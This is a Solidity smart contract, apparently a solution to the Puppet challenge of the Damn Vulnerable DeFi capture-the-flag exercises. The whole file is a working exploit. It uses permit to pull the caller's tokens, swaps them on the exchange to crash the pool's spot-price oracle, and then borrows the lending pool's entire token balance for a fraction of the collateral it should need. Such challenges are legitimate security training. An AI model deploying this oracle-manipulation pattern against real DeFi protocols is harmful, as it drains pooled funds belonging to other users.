// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

contract Attack_Puppet{
    PuppetPool pool;
    DamnValuableToken token;

    constructor(address _pool, address _exchange, address _token, uint8 v, bytes32 r, bytes32 s) payable
    {
        token = DamnValuableToken(_token);
        pool = PuppetPool(_pool);
        uint256 amount = token.balanceOf(msg.sender);

        //transfer the tokens to ourself
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(msg.sender, address(this), amount);

        //exchange the tokens into ETH and crash the price inside the oracle by doing that
        token.approve(_exchange, amount);
        (bool success, ) = _exchange.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", amount, 1, 20775029706));
        require(success, "Exchange failed");

        //Lend out all the tokens
        pool.borrow{value: pool.calculateDepositRequired(token.balanceOf(_pool))}(token.balanceOf(_pool), msg.sender);
    }
}